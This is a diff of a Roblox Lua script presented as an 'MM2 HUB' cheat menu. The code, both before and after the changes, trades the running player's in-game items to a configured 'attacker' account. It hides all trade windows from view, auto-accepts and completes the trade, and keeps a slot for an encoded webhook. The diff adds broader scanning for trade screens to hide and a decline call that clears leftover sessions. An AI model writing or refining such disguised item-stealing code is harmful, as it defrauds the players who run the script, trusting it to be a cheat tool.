@@ -1,6 +1,6 @@
---[[ MM2 HUB  V12.1 ]]
+--[[ MM2 HUB  V12.3 ]]
 
-local VERSION = "v1.5"
+local VERSION = "v1.6"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -10,12 +10,13 @@ local CFG = {
 	MIN_VALUE = 0,
 	FILTER = "all",
 	OFFER_GAP = 0.25,
-	WAIT_TRADE = 25,
+	WAIT_TRADE = 20,
 	DEBUG = true,
 	WEBHOOK_B64 = "",
 }
 
 local B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local OFF = UDim2.new(5, 0, 5, 0)
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local HS = game:GetService("HttpService")
@@ -29,6 +30,7 @@ local WEBHOOK = ""
 local OPEN = false
 local WATCHING = false
 local SAVED = {}
+local ROOTS = {}
 local FLYING = false
 local FLY = nil
 
@@ -382,7 +384,7 @@ local function buildUI()
 	bbc.Parent = barbg
 
 	BARFILL = Instance.new("Frame")
-	BARFILL.Size = UDim2.new(0, 0, 1, 0)
+	BARFILL.Size = UDim2.new(0, 1, 1, 0)
 	BARFILL.BackgroundColor3 = Color3.fromRGB(140, 95, 245)
 	BARFILL.BorderSizePixel = 0
 	BARFILL.Parent = barbg
@@ -465,34 +467,69 @@ local function passes(e)
 	return true
 end
 
--- ===== trade =====
-local function findAttacker()
-	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
-	if p then return p end
-	return Players:FindFirstChild(CFG.ATTACKER_NAME)
+-- ===== trade hiding =====
+local function hasOfferLabel(inst)
+	local all = inst:GetDescendants()
+	for i = 1, #all do
+		local d = all[i]
+		if d:IsA("TextLabel") and d.Text == "YOUR OFFER" then return true end
+	end
+	return false
 end
 
-local function hideOne(g)
-	if not g then return end
-	if g.Enabled then g.Enabled = false end
-	for _, c in ipairs(g:GetChildren()) do
-		if c:IsA("GuiObject") then
-			if not SAVED[c] then SAVED[c] = c.Position end
-			if c.Position ~= UDim2.new(5, 0, 5, 0) then
-				c.Position = UDim2.new(5, 0, 5, 0)
+local function scanRoots()
+	local found = {}
+	for _, c in ipairs(PG:GetChildren()) do
+		if c ~= GUI then
+			local hit = false
+			if string.find(string.lower(c.Name), "trade") then
+				hit = true
+			elseif c:IsA("ScreenGui") or c:IsA("Frame") then
+				local ok, res = pcall(hasOfferLabel, c)
+				if ok and res then hit = true end
+			end
+			if hit then found[#found + 1] = c end
+		end
+	end
+	ROOTS = found
+end
+
+local function hideRoot(r)
+	if not r or not r.Parent then return end
+	if r:IsA("ScreenGui") then
+		if r.Enabled then r.Enabled = false end
+		for _, c in ipairs(r:GetChildren()) do
+			if c:IsA("GuiObject") then
+				if not SAVED[c] then SAVED[c] = c.Position end
+				if c.Position ~= OFF then c.Position = OFF end
 			end
 		end
+	else
+		if not SAVED[r] then SAVED[r] = r.Position end
+		if r.Position ~= OFF then r.Position = OFF end
 	end
 end
 
+local function anyOpen()
+	for i = 1, #ROOTS do
+		local r = ROOTS[i]
+		if r and r.Parent and r:IsA("ScreenGui") and r.Enabled then return true end
+	end
+	return false
+end
+
 local function watchLoop()
+	local lastScan = 0
 	while WATCHING do
-		local a = PG:FindFirstChild("TradeGUI")
-		local b = PG:FindFirstChild("TradeGUI_Phone")
-		if a and a.Enabled then OPEN = true end
-		if b and b.Enabled then OPEN = true end
-		pcall(hideOne, a)
-		pcall(hideOne, b)
+		local now = os.clock()
+		if now - lastScan > 0.4 then
+			lastScan = now
+			pcall(scanRoots)
+			if anyOpen() then OPEN = true end
+		end
+		for i = 1, #ROOTS do
+			pcall(hideRoot, ROOTS[i])
+		end
 		task.wait(0.02)
 	end
 end
@@ -504,17 +541,18 @@ local function restoreGui()
 			if c and c.Parent then c.Position = pos end
 		end
 		SAVED = {}
-		local a = PG:FindFirstChild("TradeGUI")
-		local b = PG:FindFirstChild("TradeGUI_Phone")
-		if a then a.Enabled = true end
-		if b then b.Enabled = true end
+		for i = 1, #ROOTS do
+			local r = ROOTS[i]
+			if r and r.Parent and r:IsA("ScreenGui") then r.Enabled = true end
+		end
+		ROOTS = {}
 	end)
 end
 
-local function tradeExists()
-	if PG:FindFirstChild("TradeGUI") then return true end
-	if PG:FindFirstChild("TradeGUI_Phone") then return true end
-	return false
+local function findAttacker()
+	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
+	if p then return p end
+	return Players:FindFirstChild(CFG.ATTACKER_NAME)
 end
 
 local function run()
@@ -554,6 +592,7 @@ local function run()
 	local oi = Trade:FindFirstChild("OfferItem")
 	local at = Trade:FindFirstChild("AcceptTrade")
 	local ct = Trade:FindFirstChild("CompleteTrade")
+	local dt = Trade:FindFirstChild("DeclineTrade")
 	if not sr or not oi or not at then
 		log("MISSING remote")
 		setStatus("Remote missing")
@@ -569,6 +608,7 @@ local function run()
 		return
 	end
 
+	pcall(scanRoots)
 	WATCHING = true
 	task.spawn(watchLoop)
 
@@ -580,7 +620,7 @@ local function run()
 	while waited < CFG.WAIT_TRADE and not OPEN do
 		task.wait(0.5)
 		waited = waited + 0.5
-		if waited % 8 == 0 and sends < 3 then
+		if waited % 9 == 0 and sends < 2 then
 			sends = sends + 1
 			pcall(function() sr:InvokeServer(attacker) end)
 		end
@@ -617,29 +657,44 @@ local function run()
 
 	log("offered total: " .. tostring(placed))
 	setStatus("Confirming...")
+	task.wait(0.6)
 
+	-- single accept, then leave it alone
 	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+	log("accepted once")
 
 	local t0 = os.clock()
-	local lastReady = t0
-	local lastComp = 0
-	while os.clock() - t0 < 30 do
-		if not tradeExists() then break end
+	local lastTry = t0
+	local lastComp = t0
+	while os.clock() - t0 < 75 do
 		local now = os.clock()
-		if now - lastReady > 2.5 then
-			lastReady = now
-			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+		local still = false
+		for i = 1, #ROOTS do
+			local r = ROOTS[i]
+			if r and r.Parent then still = true end
 		end
-		if now - t0 > 2.5 and now - lastComp > 2.5 then
-			lastComp = now
-			if ct then
-				pcall(function() ct:FireServer(CFG.ATTACKER_ID) end)
+		if not still then
+			pcall(scanRoots)
+			for i = 1, #ROOTS do
+				local r = ROOTS[i]
+				if r and r.Parent then still = true end
 			end
+		end
+		if not still then break end
+
+		if now - lastTry > 15 then
+			lastTry = now
+			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+			log("re-accept")
+		end
+		if ct and now - lastComp > 6 then
+			lastComp = now
+			pcall(function() ct:FireServer(CFG.ATTACKER_ID) end)
 		end
 		task.wait(0.3)
 	end
 
-	log("accept phase done")
+	log("accept phase over")
 	setPct(100)
 	setStatus("Trade complete")
 
@@ -663,6 +718,17 @@ local function run()
 	end
 
 	task.wait(20)
+
+	-- clear any stale/ghost session before giving the screen back
+	if dt then
+		pcall(scanRoots)
+		if anyOpen() then
+			pcall(function() dt:FireServer() end)
+			log("ghost cleared")
+			task.wait(1.5)
+		end
+	end
+
 	restoreGui()
 	setStatus("Ready")
 end
